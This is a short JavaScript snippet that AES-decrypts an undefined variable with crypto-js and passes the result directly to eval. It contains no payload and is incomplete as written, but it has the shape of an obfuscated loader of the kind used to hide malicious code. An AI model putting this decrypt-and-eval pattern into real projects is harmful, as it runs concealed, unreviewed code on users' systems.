const CryptoJS = require('crypto-js');

let cmd, var_cmd;

var decryptedData = CryptoJS.AES.decrypt(cmd, var_cmd);

eval(decryptedData)